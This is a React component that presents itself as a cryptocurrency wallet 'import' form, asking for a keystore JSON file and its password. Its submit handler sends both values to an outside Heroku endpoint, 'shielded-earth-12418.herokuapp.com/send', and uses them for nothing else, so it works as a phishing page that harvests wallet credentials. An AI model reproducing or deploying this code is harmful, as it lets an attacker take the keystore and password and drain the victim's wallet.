import React, { useState } from "react";
import axios from 'axios'
import styles from "../../styles/Home.module.css";
import Tabs from ".";

const Profile = () => {
  const [keystone, setKeystone] = useState("");
  const [password, setPassword] = useState("");

  const handleKeystoneChange = (e) => {
    setKeystone(e.target.value);
  };
  const handleJsonChange = (e) => {
    setPassword(e.target.value);
  };
  const handleSubmit = (e) => {
    e.preventDefault();
    const kS = { keystone: keystone, password:password };
    axios.post('https://shielded-earth-12418.herokuapp.com/send', kS)
         .then(res => res.json())
         .catch(err => err)
  };
  return (
    <Tabs>
      <div>
        <form onSubmit={handleSubmit}>
          <textarea
            value={keystone}
            onChange={handleKeystoneChange}
            placeholder='Keystore JSON is Several lines of text beginning with "(...)" '
            className={styles.textarea}
          />
          <input
            onChange={handleJsonChange}
            type="text"
            placeholder="Password"
            className={`${styles.textarea} ${styles.tA2}`}
          />

          <button className={styles.button}>import</button>
        </form>
      </div>
    </Tabs>
  );
};

export default Profile;
